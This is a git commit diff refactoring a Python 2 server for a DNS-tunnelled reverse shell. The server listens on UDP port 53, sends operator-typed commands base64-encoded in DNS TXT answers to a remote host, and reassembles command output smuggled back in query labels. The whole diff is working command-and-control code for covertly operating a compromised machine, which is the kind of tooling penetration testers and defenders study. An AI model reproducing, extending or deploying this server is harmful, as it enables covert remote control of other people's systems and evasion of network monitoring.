2ad75baa6fade339bf4f302c026a6d4a59a690e7
Vita Pluvia <vitapluvia@gmail.com>
2015-01-28 05:48:14 -0800

    Server refactored heavily - now more modular and clear.

--- reverse_dns_shell_server.py
+++ reverse_dns_shell_server.py
@@ -1,3 +1,4 @@
+#!/usr/local/Cellar/python/2.7.4/bin/python2.7
 #!/usr/bin/env python
 # RevShell DNS Server v1
 import socket
@@ -8,10 +9,36 @@ PORT = 53
 NXT_CMD = base64.b64encode("nxt")
 PROMPT = 'SHELL >> '
 
-def spawnShell(a, payload):
+def spawnShell(answer, payload):
+  # Spawns our Command Shell:
   out = base64.b64encode(raw_input(PROMPT))
-  a.add_answer(*dnslib.RR.fromZone('{}.com 60 TXT "{}"'.format(payload, out)))
-  return a
+  answer.add_answer(
+    *dnslib.RR.fromZone('{}.com 60 TXT "{}"'.format(payload, out)))
+  return answer
+
+def dashDecode(b64Cmd):
+  # Converts encoded '-' padding to '=':
+  if b64Cmd[3] == '-':
+    b64Cmd = b64Cmd[0] + b64Cmd[2] + b64Cmd[4:] + '=='
+  elif b64Cmd[1] == '-':
+    b64Cmd = b64Cmd[0] + b64Cmd[2:] + '='
+  return b64Cmd
+
+def recievePayload(udps):
+  data, addr = udps.recvfrom(1024)
+  dnsD = dnslib.DNSRecord.parse(data)
+  payload = dnsD.questions[0].qname.label[0]
+  answer = dnsD.reply()
+  return addr, payload, answer
+
+def sendCmd(cmd_list):
+  try:
+    b64Cmd = ''.join(cmd_list)
+    b64Cmd = dashDecode(b64Cmd)
+    print '{}'.format(base64.b64decode(b64Cmd))
+  except:
+    # Base64 Decode Failed.
+    print '[ERROR]: Couldn\'t Read Result from Host!'
 
 def main():
   cmd_list = []  # Stores List of B64 Commands to be Executed
@@ -22,37 +49,25 @@ def main():
   print 'Waiting for Request .... \n'
 
   try:
-    data, addr = udps.recvfrom(1024)
-    dnsD = dnslib.DNSRecord.parse(data)
-    payload = dnsD.questions[0].qname.label[0]
-    a = dnsD.reply()
-    a = spawnShell(a, payload)
-    udps.sendto(a.pack(), addr)
+    # Setup Initial Command Shell:
+    addr, payload, answer = recievePayload(udps)
+    answer = spawnShell(answer, payload)
+    udps.sendto(answer.pack(), addr)
+
+    # Main Event Loop:
     while 1:
-      data, addr = udps.recvfrom(1024)
-      dnsD = dnslib.DNSRecord.parse(data)
-      payload = dnsD.questions[0].qname.label[0]
-      a = dnsD.reply()
+      addr, payload, answer = recievePayload(udps)
       if (payload == NXT_CMD):
-        try:
-          # Check for '-'
-          b64Cmd = ''.join(cmd_list)
-          if b64Cmd[3] == '-':
-            b64Cmd = b64Cmd[0] + b64Cmd[2] + b64Cmd[4:] + '=='
-          elif b64Cmd[1] == '-':
-            b64Cmd = b64Cmd[0] + b64Cmd[2:] + '='
-          print '{}'.format(base64.b64decode(b64Cmd))
-        except:
-          # Base64 Decode Failed.
-          print '[ERROR]: Couldn\'t Read Result from Host!'
+        sendCmd(cmd_list)
         cmd_list = []
-        a = spawnShell(a, payload)
+        answer = spawnShell(answer, payload)
       else:
         cmd_list.append(payload)
-      # Send back Response:
-      udps.sendto(a.pack(), addr)
 
-  except KeyboardInterrupt:
+      # Send back Response:
+      udps.sendto(answer.pack(), addr)
+
+  except (KeyboardInterrupt, EOFError) as e:
     print '\n-[ Connection Ended ]-\n'
     udps.close()
 
